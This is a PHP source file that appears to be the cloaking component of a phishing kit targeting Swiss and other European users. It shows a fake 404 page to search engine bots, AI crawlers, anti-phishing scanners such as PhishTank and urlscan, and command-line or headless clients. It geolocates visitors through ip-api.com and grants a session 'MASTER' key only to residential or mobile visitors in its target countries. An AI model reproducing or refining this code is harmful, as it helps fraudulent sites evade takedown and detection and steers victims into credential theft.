<?php
// =============================================
// ADVANCED ANTIBOT + GEOIP CHECK (CHCH System)
// =============================================

/**
 * REAL-LOOKING 404 PAGE
 */
function showClean404()
{
    header("HTTP/1.1 404 Not Found");
    header("Content-Type: text/html; charset=utf-8");
    header("X-Robots-Tag: noindex, nofollow, noarchive");
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 – Page Not Found</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f4f6f8;color:#333;display:flex;flex-direction:column;min-height:100vh}.bar{height:4px;background:#dc1928}.header{background:#fff;padding:15px 20px;border-bottom:1px solid #eee}.header img{height:32px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:12px;padding:40px 30px;max-width:450px;width:100%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.05)}h1{font-size:72px;font-weight:800;color:#e0e0e0;margin-bottom:10px}h2{font-size:20px;font-weight:600;margin-bottom:12px;color:#222}p{color:#666;font-size:14px;line-height:1.6;margin-bottom:25px}a.btn{display:inline-block;background:#dc1928;color:#fff;padding:12px 30px;border-radius:6px;text-decoration:none;font-weight:600;font-size:14px;transition:.2s}a.btn:hover{background:#b8141e}.footer{background:#fff;padding:15px;text-align:center;font-size:11px;color:#999;border-top:1px solid #eee}</style></head><body><div class="bar"></div><div class="header"></div><div class="main"><div class="card"><h1>404</h1><h2>Page not found</h2><p>The page you are looking for does not exist or has been moved.</p></div></div><div class="footer">&copy; ' . date('Y') . ' – All rights reserved</div></body></html>';
    exit;
}

/**
 * CHECK FOR SEARCH ENGINE BOTS
 */
function checkSearchEngineBot()
{
    $agent_lower = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $search_engine_bots = ['googlebot', 'bingbot', 'slurp', 'yandexbot', 'baiduspider', 'duckduckbot', 'applebot', 'petalbot', 'google-inspectiontool', 'google-safety', 'google-extended', 'adsbot-google', 'mediapartners-google', 'chrome-lighthouse', 'twitterbot', 'facebookexternalhit', 'facebot', 'linkedinbot', 'discordbot'];
    foreach ($search_engine_bots as $se_bot) {
        if (strpos($agent_lower, $se_bot) !== false) {
            showClean404();
        }
    }
}

/**
 * Get client IP
 */
function getClientIP()
{
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
    }
    return '127.0.0.1';
}

/**
 * Get IP geolocation info
 */
function getIpInfo($ip = '')
{
    $url = "http://ip-api.com/json/" . $ip . "?fields=status,countryCode,isp,org,as,mobile,proxy,hosting";
    $context = stream_context_create(['http' => ['timeout' => 3]]);
    $ipinfo = @file_get_contents($url, false, $context);
    if (!$ipinfo) return null;
    return json_decode($ipinfo, true);
}

/**
 * Check if User-Agent is mobile
 */
function isMobile()
{
    return preg_match('/android|iphone|ipad|ipod|blackberry|windows phone|opera mini|iemobile/i', strtolower($_SERVER['HTTP_USER_AGENT']));
}

/**
 * Validate session chain
 */
function validateSession($min_step = 1)
{
    header_remove("X-Powered-By");
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: SAMEORIGIN");
    header("X-XSS-Protection: 1; mode=block");

    checkSearchEngineBot();

    // Check MASTER key
    if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
        @error_log("MASTER key missing for session");
        showClean404();
    }

    // Check STEP_CHAIN
    if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < $min_step) {
        @error_log("STEP_CHAIN validation failed: required=$min_step, actual=" . ($_SESSION['STEP_CHAIN'] ?? 'null'));
        showClean404();
    }
}

/**
 * Validate geolocation and grant MASTER access
 */
function validateGeoAndGrantMaster()
{
    $agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $agent_lower = strtolower($agent);
    $visitor_ip = getClientIP();

    // Bot check
    checkSearchEngineBot();

    $bad_uas = [
        'bot', 'crawl', 'spider', 'googlebot', 'google-inspectiontool', 'googleother', 'storebot-google',
        'adsbot-google', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandex', 'exabot',
        'gptbot', 'claudebot', 'anthropic-ai', 'perplexitybot', 'facebookexternalhit', 'facebot',
        'twitterbot', 'linkedinbot', 'discordbot', 'curl', 'wget', 'python', 'java', 'headless',
        'puppeteer', 'selenium', 'brandverity', 'phishtank', 'urlscan', 'ahrefs', 'semrush'
    ];

    foreach ($bad_uas as $bad) {
        if (strpos($agent_lower, $bad) !== false) {
            @error_log("Bot detected: $bad in UA");
            showClean404();
        }
    }

    if (empty($agent) || $agent === '-' || strlen($agent) < 15) {
        @error_log("Empty or suspicious User-Agent");
        showClean404();
    }

    // Get IP info
    $ipinfo_json = getIpInfo($visitor_ip);

    $country = $ipinfo_json['countryCode'] ?? '';
    $isp     = $ipinfo_json['isp'] ?? '';
    $org     = $ipinfo_json['org'] ?? '';
    $org_lower = strtolower($org . ' ' . $isp);

    $is_proxy   = $ipinfo_json['proxy'] ?? false;
    $is_hosting = $ipinfo_json['hosting'] ?? false;

    // Check for iCloud Private Relay
    $is_icloud_private_relay = false;
    if ($ipinfo_json) {
        $isp_l = strtolower($ipinfo_json['isp'] ?? '');
        $org_l = strtolower($ipinfo_json['org'] ?? '');
        if (strpos($isp_l, 'apple') !== false || strpos($isp_l, 'icloud') !== false ||
            strpos($isp_l, 'private relay') !== false || strpos($org_l, 'apple') !== false ||
            $country === 'XX') {
            $is_icloud_private_relay = true;
        }
    }

    // Check for Cloudflare WARP
    $is_cloudflare_warp = false;
    if ($ipinfo_json) {
        $isp_l = strtolower($ipinfo_json['isp'] ?? '');
        if (strpos($isp_l, 'cloudflare') !== false || strpos($isp_l, 'warp') !== false) {
            $is_cloudflare_warp = true;
        }
    }

    // Residential ISPs list (CH/FR/DE/IT/AT/LI)
    $is_known_residential_fai = (
        // SUISSE
        strpos($org_lower, "swisscom") !== false || strpos($org_lower, "bluewin") !== false ||
        strpos($org_lower, "sunrise") !== false || strpos($org_lower, "upc") !== false ||
        strpos($org_lower, "cablecom") !== false || strpos($org_lower, "salt") !== false ||
        strpos($org_lower, "quickline") !== false || strpos($org_lower, "init7") !== false ||
        strpos($org_lower, "wingo") !== false || strpos($org_lower, "yallo") !== false ||
        strpos($org_lower, "teleboy") !== false || strpos($org_lower, "mbudget") !== false ||
        strpos($org_lower, "iway") !== false || strpos($org_lower, "green.ch") !== false ||
        strpos($org_lower, "vtx") !== false || strpos($org_lower, "netplus") !== false ||
        strpos($org_lower, "sak") !== false || strpos($org_lower, "solnet") !== false ||
        strpos($org_lower, "monzoon") !== false || strpos($org_lower, "broadband.ch") !== false ||
        strpos($org_lower, "swiss4net") !== false ||
        // FRANCE
        strpos($org_lower, "orange") !== false || strpos($org_lower, "sfr") !== false ||
        strpos($org_lower, "bouygues") !== false || strpos($org_lower, "free") !== false ||
        strpos($org_lower, "iliad") !== false || strpos($org_lower, "sosh") !== false ||
        // ALLEMAGNE/ITALIE/AUTRICHE/LIECHTENSTEIN
        strpos($org_lower, "deutsche telekom") !== false || strpos($org_lower, "vodafone") !== false ||
        strpos($org_lower, "o2") !== false || strpos($org_lower, "tim") !== false ||
        strpos($org_lower, "a1 telekom") !== false || strpos($org_lower, "telecom liechtenstein") !== false ||
        // UK
        strpos($org_lower, "bt") !== false || strpos($org_lower, "virgin") !== false ||
        strpos($org_lower, "vodafone uk") !== false || strpos($org_lower, "sky") !== false
    );

    $target_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI', 'GB', 'UK'];

    // Access logic
    $allow_access = (
        (isMobile() && in_array($country, $target_countries)) ||
        ($is_icloud_private_relay && in_array($country, $target_countries)) ||
        ($is_cloudflare_warp && isMobile() && in_array($country, $target_countries)) ||
        (in_array($country, $target_countries) && $is_known_residential_fai) ||
        (in_array($country, $target_countries) && !$is_proxy && !$is_hosting) ||
        ($ipinfo_json === null && isMobile() && in_array($country, $target_countries)) ||
        $visitor_ip === '127.0.0.1'
    );

    if ($allow_access) {
        $_SESSION['MASTER'] = true;
        $_SESSION['STEP_CHAIN'] = 1;
        $_SESSION['country'] = $country;
        @error_log("Access GRANTED: IP=$visitor_ip, Country=$country, Mobile=" . (isMobile()?'Y':'N') . ", ISP=$isp");
        return true;
    } else {
        @error_log("Access DENIED: IP=$visitor_ip, Country=$country, ISP=$isp, Proxy=$is_proxy, Hosting=$is_hosting");
        showClean404();
    }
}
?>
